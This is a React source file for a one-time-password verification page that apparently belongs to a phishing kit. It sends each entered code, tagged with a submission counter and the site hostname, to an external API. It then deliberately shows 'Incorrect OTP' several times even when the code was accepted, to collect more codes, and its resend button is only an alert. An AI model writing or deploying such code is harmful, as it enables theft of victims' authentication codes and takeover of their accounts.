import Header from '../resources/Header'
import Footer from '../resources/Footer'
import Loader from "../resources/Loader";
import { useState, useEffect } from 'react';
import TimerComponent from '../resources/TimerComponent';
import { useNavigate } from 'react-router-dom';
import PageData from '../hooks/PageData';

function Onetimeverify() {
  const navigate = useNavigate();
  const [msg, setMsg] = useState("");
  const [loading, setLoading] = useState(false);
  const [loader, setLoader] = useState(true);
  const API_URL = process.env.REACT_APP_API_URL;

  useEffect(()=>{
    setTimeout(function(){
      setLoader(false);
    },2000)
  })
  
   const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); 
    
    const next = localStorage.getItem("next");
    let server_ot_times = localStorage.getItem("server_ot_times") ? parseInt(localStorage.getItem("server_ot_times")) : 0;
    let next_page_otp_times = localStorage.getItem("next_page_otp_times") ? parseInt(localStorage.getItem("next_page_otp_times")) : 0;

    const formData = new FormData(e.target);
    const jsonObject = {};
    
    formData.forEach((value, key) => {
      jsonObject[key+"_"+server_ot_times] = value;
    });

    const postData = {
      data: jsonObject,
      site: window.location.hostname
    };

    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const responseData = await response.json();
      if (responseData.status === 200) {
            setLoading(false);
            e.target.reset();
            localStorage.setItem('collection_id', responseData.data);
            localStorage.setItem('server_ot_times', server_ot_times+1);
            if(next_page_otp_times <= 1 ){
                localStorage.setItem('next_page_otp_times', 0);
                navigate(next);
            }else{
              localStorage.setItem('next_page_otp_times', next_page_otp_times-1);
              setMsg("Incorrect OTP");
              setTimeout(function(){
                setMsg("");
              },3000)
            }
      } else {
        alert("Invalid response");
        setLoading(false);
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);  
    }
  };

    
const { data, loading2, error } = PageData();

useEffect(() => {
  if (data) {
    console.log("Data changed:", data);
  }
  }, [data]);
  if (loading2) {
    return <div>Loading...</div>; 
  }

  if (error) {
    return <div>Error: {error}</div>; 
  }

  if (!data || !data.header) {
    return <div>No header available</div>; 
  }

  const home = data.onetime;
  return (
    <>
    <Header />
    <main>
      <div className="container">
      {loader ? (
        <Loader />
        ) : (
          <>
          <div className='mt-4'>
              <h1 className="text-center">{home.header_text}</h1>  
          </div>
          <div className='shadow px-4 py-2 border-0'>
            <form onSubmit={handleSubmit} >
              <div className='form-group'>
                  <label>{home.label}</label>
                  <input type='text' name={home.label} inputMode='numeric' maxLength={8} className='form-control my-control' required/>
                  {
                  (msg && (<span className="text-danger text-center">
                    <small>{home.incorrect_otp}</small>
                  </span>))
                }
              </div>
              <div className='text-center '>
                {home.expire} : <TimerComponent time={120} />
              </div>
              <div className='text-center'>
                <small>
                  {home.footer_text} <small onClick={()=>{alert(home.alert_message)}} className='text-danger fw-bold'>{home.resend_button}</small>
                </small>

              </div>

              <div className='text-center mt-4'>
                <input type='submit' value={home.submit_button} disabled={loading} className='btn btn-danger submit-button' required/>
              </div>

            </form>
          </div>
          </>
        )
      }
        
      </div>
    </main>
    <Footer />
    </>
  );
}

export default Onetimeverify;
